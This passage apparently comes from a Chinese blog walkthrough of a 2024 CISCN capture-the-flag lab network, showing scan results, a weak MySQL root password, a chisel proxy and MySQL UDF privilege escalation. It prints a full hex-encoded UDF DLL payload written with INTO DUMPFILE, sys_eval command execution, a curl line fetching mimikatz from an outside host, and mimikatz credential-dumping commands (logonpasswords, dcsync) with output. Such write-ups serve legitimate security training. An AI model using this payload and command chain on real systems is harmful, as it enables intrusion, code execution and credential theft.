<span class="token number">192.168</span>.8.9:1433 <span class="token function">open</span>
<span class="token number">192.168</span>.8.38:445 <span class="token function">open</span>
<span class="token number">192.168</span>.8.26:445 <span class="token function">open</span>
<span class="token number">192.168</span>.8.16:445 <span class="token function">open</span>
<span class="token number">192.168</span>.8.12:445 <span class="token function">open</span>
<span class="token number">192.168</span>.8.9:445 <span class="token function">open</span>
<span class="token number">192.168</span>.8.42:80 <span class="token function">open</span>
<span class="token number">192.168</span>.8.42:22 <span class="token function">open</span>
<span class="token number">192.168</span>.8.26:8080 <span class="token function">open</span>
<span class="token number">192.168</span>.8.16:8080 <span class="token function">open</span>
<span class="token number">192.168</span>.8.146:8080 <span class="token function">open</span>
<span class="token number">192.168</span>.8.9:8000 <span class="token function">open</span>
<span class="token number">192.168</span>.8.9:80 <span class="token function">open</span>
<span class="token number">192.168</span>.8.38:3306 <span class="token function">open</span>
<span class="token number">192.168</span>.8.12:88 <span class="token function">open</span>
<span class="token number">192.168</span>.8.42:8060 <span class="token function">open</span>
<span class="token number">192.168</span>.8.9:8172 <span class="token function">open</span>
<span class="token number">192.168</span>.8.42:9094 <span class="token function">open</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.9     WORKGROUP<span class="token punctuation">\</span>WIN-IISSERER        
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.26    WORKGROUP<span class="token punctuation">\</span>WIN-PC3788          
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.12    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> DC:VERTEXSOFT<span class="token punctuation">\</span>RODC         
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.38    WORKGROUP<span class="token punctuation">\</span>WIN-OPS88           
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.16    WORKGROUP<span class="token punctuation">\</span>WIN-SERVER03        
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42:8060  code:404 len:555    title:404 Not Found
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.12
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>RODC
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.12
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.38
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-OPS88
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.38
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.26
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-PC3788
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.26
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.9
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-IISSERER
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.9
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.16
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-SERVER03
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.16
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.146:8080 code:302 len:0      title:None 跳转url: http://192.168.8.146:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>6FF5708E4EEFFF8BDFC2934D53AC7C8F
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.146:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>6FF5708E4EEFFF8BDFC2934D53AC7C8F code:200 len:1383   title:Master ERP login Form
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42       code:302 len:99     title:None 跳转url: http://192.168.8.42/users/sign_in
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.26:8080  code:200 len:147    title:第一个 JSP 程序
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9        code:200 len:43679  title:VertexSoft
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle https://192.168.8.9:8172  code:404 len:0      title:None
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.16:8080  code:403 len:594    title:None
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42/users/sign_in code:200 len:11166  title:登录 · GitLab
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://192.168.8.146:8080 poc-yaml-spring-actuator-heapdump-file 
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://192.168.8.146:8080 poc-yaml-springboot-env-unauth spring2
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> mysql <span class="token number">192.168</span>.8.38:3306:root <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="WIN-OPS88"><a href="#WIN-OPS88" class="headerlink" title="WIN-OPS88"></a>WIN-OPS88</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.38
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-OPS88
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.38
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> mysql <span class="token number">192.168</span>.8.38:3306:root <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>做chisel代理把WIN-OPS88的数据库端口转发出来（其实可以直接做sockets代理出所有的内网ip，巨魔教的）</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095403405.png" alt="image-20240721095403405"></p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095424140.png" alt="image-20240721095424140"></p>
<p>既然有账密，那么直接sql连上去，数据库里没别的东西</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721225527342.png" alt="image-20240721225527342"></p>
<p>尝试udf提权，注意是win64的payload（这里我看别人直接用mdut工具一把梭了，而我的还在报错）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">"%plugin%"</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span> <span class="token keyword">INTO</span> <span class="token keyword">DUMPFILE</span> <span class="token string">"C:\\Program Files\\MySQL\\MySQL Server 8.0\\lib\\plugin\\udf.so"</span><span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">FUNCTION</span> sys_eval <span class="token keyword">RETURNS</span> STRING <span class="token keyword">SONAME</span> <span class="token string">"udf.so"</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"type C:\\Users\\Administrator\\flag\\flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>读到flag（草我怎么写了个so进去，应该是dll的）</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095325681.png" alt="image-20240721095325681"></p>
<p>接下来尝试丢mimikatz收集信息（实际无用）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"curl  http://192.168.36.88:8080/mimikatz.exe -o mimikatz.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "lsadump::dcsync /user:Administrator" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "creds_all" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # log
Using 'mimikatz.log' for logfile : OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 68033 (00000000:000109c1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/21/2024 6:17:47 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN-OPS88$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN-OPS88$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 7/21/2024 6:17:47 AM
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN-OPS88$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : win-ops88$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 31473 (00000000:00007af1)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/21/2024 6:17:47 AM
SID               : S-1-5-96-0-0
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN-OPS88$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 68016 (00000000:000109b0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/21/2024 6:17:47 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN-OPS88$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/21/2024 6:17:47 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 31470 (00000000:00007aee)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/21/2024 6:17:47 AM
SID               : S-1-5-96-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN-OPS88$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 30495 (00000000:0000771f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/21/2024 6:17:46 AM
SID               : 
	msv :	
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN-OPS88$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 7/21/2024 6:17:46 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN-OPS88$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : win-ops88$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

mimikatz(commandline) # exit
